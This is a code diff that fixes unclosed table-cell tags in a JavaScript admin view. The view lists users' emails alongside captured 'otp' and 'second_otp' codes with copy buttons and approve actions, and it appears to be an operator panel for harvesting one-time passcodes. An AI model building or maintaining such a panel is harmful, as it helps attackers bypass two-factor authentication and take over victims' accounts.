@@ -865,10 +865,11 @@ function escapeHtml(str) {
 }
 
 // Modified displayUsers function with date column
+// Modified displayUsers function with date column - PROPERLY ALIGNED
 function displayUsers(users) {
   const tbody = document.getElementById('usersTableBody');
   if (!users.length) {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users</td</tr>';
+    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users</td></tr>';
     return;
   }
   
@@ -913,15 +914,17 @@ function displayUsers(users) {
       });
     }
     
+    // PROPER TABLE ROW WITH CORRECTLY CLOSED TD TAGS
     return `<tr>
-      <td><div class="email-cell"><span>${escapeHtml(user.email)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></td
-      <td>${user.otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td
-      <td>${user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td
-      <td>${statusBadge}</td
-      <td><span style="font-size: 12px; font-family: monospace;">${formattedDate}</span></td
-      <td>${actionButtons}</td
+      <td><div class="email-cell"><span>${escapeHtml(user.email)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></td>
+      <td>${user.otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
+      <td>${user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
+      <td>${statusBadge}</td>
+      <td><span style="font-size: 12px; font-family: monospace; white-space: nowrap;">${formattedDate}</span></td>
+      <td>${actionButtons}</td>
     </tr>`;
   }).join('');
+
 }
 
 async function approveEmail(email) { 
